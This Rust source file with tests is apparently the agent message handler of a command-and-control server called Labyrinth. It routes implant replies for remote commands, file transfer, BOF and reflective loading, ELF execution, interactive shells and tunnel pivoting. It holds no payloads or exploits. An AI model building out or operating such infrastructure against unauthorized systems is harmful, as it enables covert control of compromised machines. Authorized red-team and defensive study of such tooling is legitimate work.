use crate::error::{LabyrinthError, Result};
use crate::framing::{FrameCodec, FrameReader};
use crate::protocol::Message;
use crate::server::core::LabyrinthServer;
#[cfg(target_os = "windows")]
use crate::server::netstack_bridge_windows::WindowsNetstackBridge;
use crate::streaming::models::{ConnectionStatus, DataDirection, StreamMessage};

use std::sync::Arc;
use tokio::io::{AsyncBufRead, AsyncWrite};
use tokio::sync::mpsc;
use tracing::{error, info, warn};

/// Handles writing outgoing messages to the agent's stream from a queue.
/// This runs in its own dedicated task for each agent.
pub async fn handle_writer<W>(mut writer: tokio::io::WriteHalf<W>, mut rx: mpsc::Receiver<Message>)
where
    W: AsyncWrite + Unpin + Send + 'static,
{
    while let Some(message) = rx.recv().await {
        match FrameCodec::CONTROL.write(&mut writer, &message).await {
            Ok(()) => {}
            // Unencodable message: drop it, the stream itself is still healthy.
            Err(e @ (LabyrinthError::Json(_) | LabyrinthError::FrameTooLarge { .. })) => {
                error!("Dropping outgoing message: {}", e);
            }
            Err(e) => {
                error!("Failed to write message to stream: {}", e);
                break;
            }
        }
    }
}

/// Handles reading incoming messages from the agent's stream.
/// This runs in its own dedicated task for each agent.
///
/// `session` is this connection's outbound queue. On disconnect the agent
/// entry is removed only if it still belongs to this session, so a stale
/// connection cannot evict a newer one registered under the same ID.
pub async fn handle_reader<R>(
    reader: R,
    server: Arc<LabyrinthServer>,
    agent_id: String,
    session: mpsc::Sender<Message>,
) -> Result<()>
where
    R: AsyncBufRead + Unpin + Send,
{
    let mut frames = FrameReader::new(reader, FrameCodec::CONTROL);
    loop {
        match frames.next::<Message>().await {
            Ok(None) => {
                info!("Agent {} disconnected.", agent_id);
                break;
            }
            Ok(Some(message)) => {
                // A message was received, update the agent's last seen time.
                if let Some(agent) = server.agents().read().await.get(&agent_id) {
                    *agent.last_seen.lock().await = std::time::Instant::now();
                }

                if let Err(e) = process_message(server.clone(), &agent_id, message).await {
                    error!("Error processing message from agent {}: {}", agent_id, e);
                }
            }
            Err(LabyrinthError::Json(e)) => {
                error!("Failed to parse message from agent {}: {}", agent_id, e);
            }
            Err(e) => {
                error!("Failed to read from agent stream {}: {}", agent_id, e);
                break;
            }
        }
    }

    if remove_session(&server, &agent_id, &session).await {
        server.cleanup_portal_connections_for_agent(&agent_id).await;
        warn!("Agent {} removed due to disconnection.", agent_id);
    }
    Ok(())
}

async fn remove_session(
    server: &LabyrinthServer,
    agent_id: &str,
    session: &mpsc::Sender<Message>,
) -> bool {
    let mut agents = server.agents().write().await;
    match agents.get(agent_id) {
        Some(agent) if agent.sender.same_channel(session) => {
            agents.remove(agent_id);
            true
        }
        _ => false,
    }
}

/// Hand a reply to the UI task blocked on this agent's pending request.
async fn deliver_pending_response(server: &LabyrinthServer, agent_id: &str, message: Message) {
    let Some(agent) = server.agents().read().await.get(agent_id).cloned() else {
        return;
    };
    let pending = agent.command_response.lock().await.take();
    match pending {
        Some(sender) => {
            if sender.send(message).is_err() {
                error!("Waiting UI task for agent {} went away", agent_id);
            }
        }
        None => warn!(
            "Agent {} sent an unsolicited response; nothing is waiting for it",
            agent_id
        ),
    }
}

/// Processes a single message received from an agent.
async fn process_message(
    server: Arc<LabyrinthServer>,
    agent_id: &str,
    message: Message,
) -> Result<()> {
    match message {
        Message::Pong => {
            // Pong received, agent is alive. Last_seen is already updated.
        }
        Message::TunnelStarted => {
            info!("Agent {} confirmed tunnel started.", agent_id);
        }
        Message::TunnelStopped => {
            info!("Agent {} confirmed tunnel stopped.", agent_id);
        }
        message @ (Message::CommandResponse { .. }
        | Message::FileUploadResponse { .. }
        | Message::FileDownloadResponse { .. }
        | Message::DropDwellerResponse { .. }
        | Message::ConfigureDwellerResponse { .. }
        | Message::BofExecutionResponse { .. }
        | Message::ReflectiveLoadResponse { .. }
        | Message::LinuxElfExecutionResponse { .. }) => {
            deliver_pending_response(&server, agent_id, message).await;
        }
        Message::DwellerPollTasks {
            dweller_id,
            max_tasks,
        } => {
            if dweller_id != agent_id {
                warn!(
                    "Dweller {} tried to poll tasks for {}",
                    agent_id, dweller_id
                );
                return Ok(());
            }
            let tasks = server
                .claim_dweller_tasks(agent_id, max_tasks.clamp(1, 100))
                .await?;
            if let Some(agent) = server.agents().read().await.get(agent_id) {
                if let Err(e) = agent.sender.send(Message::DwellerTasks { tasks }).await {
                    error!("Failed to send dweller task batch: {}", e);
                }
            }
        }
        Message::DwellerTaskResult { dweller_id, result } => {
            if dweller_id != agent_id {
                warn!(
                    "Dweller {} tried to complete task for {}",
                    agent_id, dweller_id
                );
                return Ok(());
            }
            if !server.complete_dweller_task(agent_id, result).await? {
                warn!("Dweller {} returned result for unknown task", agent_id);
            }
        }
        Message::ShellSessionStarted { .. }
        | Message::ShellSessionOutput { .. }
        | Message::ShellSessionClose { .. } => {
            if let Some(agent) = server.agents().read().await.get(agent_id) {
                let shell_events = agent.shell_events.lock().await;
                if let Some(sender) = shell_events.as_ref() {
                    if sender.send(message).is_err() {
                        error!("Failed to send shell session event to interactive shell task.");
                    }
                }
            }
        }
        Message::Stream(stream_msg) => {
            #[cfg(target_os = "windows")]
            if WindowsNetstackBridge::try_handle_agent_stream(&stream_msg).await {
                return Ok(());
            }

            // Handle streaming data coming from the agent (Portal mode)
            match stream_msg {
                StreamMessage::Data {
                    connection_id,
                    payload,
                    direction,
                } => {
                    if direction == DataDirection::TargetToClient {
                        if let Some(cm) = server.get_connection_manager().await {
                            let _ = cm
                                .update_connection_status(&connection_id, ConnectionStatus::Active)
                                .await;
                        }
                        if let Some(sm) = server.get_stream_manager().await {
                            if let Err(e) = sm.send_to_client(connection_id, payload).await {
                                error!("Failed to deliver agent data to client: {}", e);
                            }
                        } else {
                            error!("Stream manager unavailable to handle agent data");
                        }
                    }
                }
                StreamMessage::Close { connection_id, .. } => {
                    if let Some(sm) = server.get_stream_manager().await {
                        let _ = sm.terminate_stream(connection_id).await;
                    }
                    if let Some(cm) = server.get_connection_manager().await {
                        let _ = cm
                            .update_connection_status(&connection_id, ConnectionStatus::Closing)
                            .await;
                        let _ = cm.cleanup_connection(&connection_id).await;
                    }
                    let _ = server.unregister_connection_owner(&connection_id).await;
                }
                StreamMessage::SetupAck {
                    connection_id,
                    success,
                    error_message,
                } => {
                    if let Some(cm) = server.get_connection_manager().await {
                        if success {
                            let _ = cm
                                .update_connection_status(&connection_id, ConnectionStatus::Active)
                                .await;
                        } else {
                            let reason =
                                error_message.unwrap_or_else(|| "unknown error".to_string());
                            let _ = cm
                                .update_connection_status(
                                    &connection_id,
                                    ConnectionStatus::Error(reason.clone()),
                                )
                                .await;
                            let _ = cm.cleanup_connection(&connection_id).await;
                            if let Some(sm) = server.get_stream_manager().await {
                                let _ = sm.terminate_stream(connection_id).await;
                            }
                            let _ = server.unregister_connection_owner(&connection_id).await;
                            warn!(
                                "Agent {} failed to establish streaming connection {}: {}",
                                agent_id, connection_id, reason
                            );
                        }
                    }
                }
                _ => {
                    // Other stream messages can be ignored for now
                }
            }
        }
        _ => {
            warn!(
                "Received unhandled message from agent {}: {:?}",
                agent_id, message
            );
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::protocol::{
        AgentInfo, AgentKind, DwellerHibernationConfig, DwellerInstallReceipt, DwellerTaskKind,
        DwellerTaskResult, DwellerTaskStatus,
    };
    use crate::server::core::ConnectedAgent;
    use crate::server::dweller_registry::{DwellerRecord, DwellerRegistry};
    use tokio::sync::{oneshot, Mutex};
    use tokio::time::{timeout, Duration};

    fn agent(id: &str, sender: mpsc::Sender<Message>) -> ConnectedAgent {
        ConnectedAgent {
            id: id.to_string(),
            info: AgentInfo {
                name: id.to_string(),
                hostname: "h".into(),
                os: "linux".into(),
                arch: "x86_64".into(),
                interfaces: vec![],
                auth_key: None,
                kind: AgentKind::Dweller,
                stable_id: Some(id.to_string()),
                listener_addr: None,
                listener_port: None,
                connectivity: Default::default(),
            },
            sender,
            transport_label: "tcp/tls".into(),
            quic_connection: None,
            tunnel_active: false,
            tunnel_subnet: None,
            tun_name: None,
            last_seen: Arc::new(Mutex::new(std::time::Instant::now())),
            command_response: Arc::new(Mutex::new(None)),
            shell_events: Arc::new(Mutex::new(None)),
        }
    }

    fn record(id: &str) -> DwellerRecord {
        DwellerRecord::from_receipt(
            DwellerInstallReceipt {
                dweller_id: id.into(),
                dweller_name: id.into(),
                hostname: "h".into(),
                os: "linux".into(),
                arch: "x86_64".into(),
                listen_addr: "10.0.0.9".into(),
                listen_port: 45454,
                fingerprint: "00".repeat(32),
                install_path: "/x".into(),
                config_dir: "/y".into(),
                service_name: "svc".into(),
                callback_servers: vec![],
                parent_path: vec![],
                hibernation: DwellerHibernationConfig::default(),
            },
            "secret".into(),
        )
    }

    /// Server with dwellers `a` and `b` connected, three tasks queued for `a`.
    async fn server_with_dwellers() -> (
        Arc<LabyrinthServer>,
        mpsc::Receiver<Message>,
        mpsc::Receiver<Message>,
    ) {
        let mut registry = DwellerRegistry::in_memory();
        registry.upsert(record("a"));
        registry.upsert(record("b"));
        for i in 0..3 {
            registry.enqueue_task(
                "a",
                DwellerTaskKind::Command {
                    command: format!("cmd{i}"),
                },
                "t0".into(),
            );
        }
        let server = Arc::new(LabyrinthServer::new(false, None).with_dweller_registry(registry));
        let (tx_a, rx_a) = mpsc::channel(8);
        let (tx_b, rx_b) = mpsc::channel(8);
        server
            .agents()
            .write()
            .await
            .insert("a".into(), agent("a", tx_a));
        server
            .agents()
            .write()
            .await
            .insert("b".into(), agent("b", tx_b));
        (server, rx_a, rx_b)
    }

    #[tokio::test]
    async fn dweller_poll_claims_bounded_batch_for_itself() {
        let (server, mut rx_a, _rx_b) = server_with_dwellers().await;
        process_message(
            server.clone(),
            "a",
            Message::DwellerPollTasks {
                dweller_id: "a".into(),
                max_tasks: 2,
            },
        )
        .await
        .unwrap();
        match timeout(Duration::from_secs(2), rx_a.recv()).await.unwrap() {
            Some(Message::DwellerTasks { tasks }) => assert_eq!(tasks.len(), 2),
            other => panic!("unexpected {other:?}"),
        }
    }

    #[tokio::test]
    async fn dweller_poll_clamps_zero_batch_to_one() {
        let (server, mut rx_a, _rx_b) = server_with_dwellers().await;
        process_message(
            server.clone(),
            "a",
            Message::DwellerPollTasks {
                dweller_id: "a".into(),
                max_tasks: 0,
            },
        )
        .await
        .unwrap();
        match rx_a.recv().await {
            Some(Message::DwellerTasks { tasks }) => assert_eq!(tasks.len(), 1),
            other => panic!("unexpected {other:?}"),
        }
    }

    #[tokio::test]
    async fn dweller_cannot_poll_or_complete_another_dwellers_tasks() {
        let (server, mut rx_a, mut rx_b) = server_with_dwellers().await;
        process_message(
            server.clone(),
            "b",
            Message::DwellerPollTasks {
                dweller_id: "a".into(),
                max_tasks: 10,
            },
        )
        .await
        .unwrap();
        assert!(rx_a.try_recv().is_err());
        assert!(rx_b.try_recv().is_err());

        let task_id = server.dweller_registry().read().await.dwellers["a"].tasks[0]
            .task_id
            .clone();
        process_message(
            server.clone(),
            "b",
            Message::DwellerTaskResult {
                dweller_id: "a".into(),
                result: DwellerTaskResult {
                    task_id,
                    success: true,
                    output: "forged".into(),
                    error: None,
                    finished_at: "t1".into(),
                },
            },
        )
        .await
        .unwrap();
        let registry = server.dweller_registry().read().await;
        assert!(registry.dwellers["a"]
            .tasks
            .iter()
            .all(|task| task.status == DwellerTaskStatus::Pending));
    }

    #[tokio::test]
    async fn dweller_task_result_completes_own_task() {
        let (server, _rx_a, _rx_b) = server_with_dwellers().await;
        let task_id = server.dweller_registry().read().await.dwellers["a"].tasks[0]
            .task_id
            .clone();
        process_message(
            server.clone(),
            "a",
            Message::DwellerTaskResult {
                dweller_id: "a".into(),
                result: DwellerTaskResult {
                    task_id: task_id.clone(),
                    success: true,
                    output: "ok".into(),
                    error: None,
                    finished_at: "t1".into(),
                },
            },
        )
        .await
        .unwrap();
        let registry = server.dweller_registry().read().await;
        let task = registry.dwellers["a"]
            .tasks
            .iter()
            .find(|t| t.task_id == task_id)
            .unwrap();
        assert_eq!(task.status, DwellerTaskStatus::Completed);
    }

    #[tokio::test]
    async fn unsolicited_response_is_dropped_and_pending_slot_is_single_use() {
        let (server, _rx_a, _rx_b) = server_with_dwellers().await;
        let response = || Message::CommandResponse {
            output: "x".into(),
            error: None,
        };
        // Nobody waiting: must not panic or error.
        process_message(server.clone(), "a", response())
            .await
            .unwrap();

        let (tx, rx) = oneshot::channel();
        let slot = server.agents().read().await["a"].command_response.clone();
        *slot.lock().await = Some(tx);
        process_message(server.clone(), "a", response())
            .await
            .unwrap();
        assert!(rx.await.is_ok());
        assert!(slot.lock().await.is_none());
        // Message for an unknown agent is ignored.
        process_message(server.clone(), "ghost", response())
            .await
            .unwrap();
    }

    #[tokio::test]
    async fn shell_events_are_routed_to_attached_shell() {
        let (server, _rx_a, _rx_b) = server_with_dwellers().await;
        let (tx, mut rx) = mpsc::unbounded_channel();
        *server.agents().read().await["a"].shell_events.lock().await = Some(tx);
        process_message(
            server.clone(),
            "a",
            Message::ShellSessionOutput {
                session_id: "s".into(),
                data_b64: "aGk=".into(),
            },
        )
        .await
        .unwrap();
        assert!(matches!(
            rx.try_recv(),
            Ok(Message::ShellSessionOutput { .. })
        ));
    }

    #[tokio::test]
    async fn remove_session_only_removes_matching_channel() {
        let (server, _rx_a, _rx_b) = server_with_dwellers().await;
        let (other, _rx) = mpsc::channel(1);
        assert!(!remove_session(&server, "a", &other).await);
        assert!(server.agents().read().await.contains_key("a"));

        let current = server.agents().read().await["a"].sender.clone();
        assert!(remove_session(&server, "a", &current).await);
        assert!(!server.agents().read().await.contains_key("a"));
        assert!(!remove_session(&server, "a", &current).await);
    }

    #[tokio::test]
    async fn writer_frames_messages_and_stops_when_queue_closes() {
        let (client, server_io) = tokio::io::duplex(4096);
        let (_read, write) = tokio::io::split(server_io);
        let (tx, rx) = mpsc::channel(4);
        let writer = tokio::spawn(handle_writer(write, rx));
        tx.send(Message::Ping).await.unwrap();
        tx.send(Message::Pong).await.unwrap();
        drop(tx);
        timeout(Duration::from_secs(2), writer)
            .await
            .unwrap()
            .unwrap();

        let mut client = tokio::io::BufReader::new(client);
        let codec = FrameCodec::CONTROL;
        assert!(matches!(
            codec.read::<_, Message>(&mut client).await.unwrap(),
            Some(Message::Ping)
        ));
        assert!(matches!(
            codec.read::<_, Message>(&mut client).await.unwrap(),
            Some(Message::Pong)
        ));
    }

    #[tokio::test]
    async fn reader_skips_malformed_frames_and_cleans_up_on_eof() {
        let (server, _rx_a, _rx_b) = server_with_dwellers().await;
        let session = server.agents().read().await["a"].sender.clone();
        let input = b"{garbage}\n\"Pong\"\n".to_vec();
        let reader = tokio::io::BufReader::new(std::io::Cursor::new(input));
        timeout(
            Duration::from_secs(2),
            handle_reader(reader, server.clone(), "a".into(), session),
        )
        .await
        .unwrap()
        .unwrap();
        assert!(!server.agents().read().await.contains_key("a"));
        assert!(server.agents().read().await.contains_key("b"));
    }
}
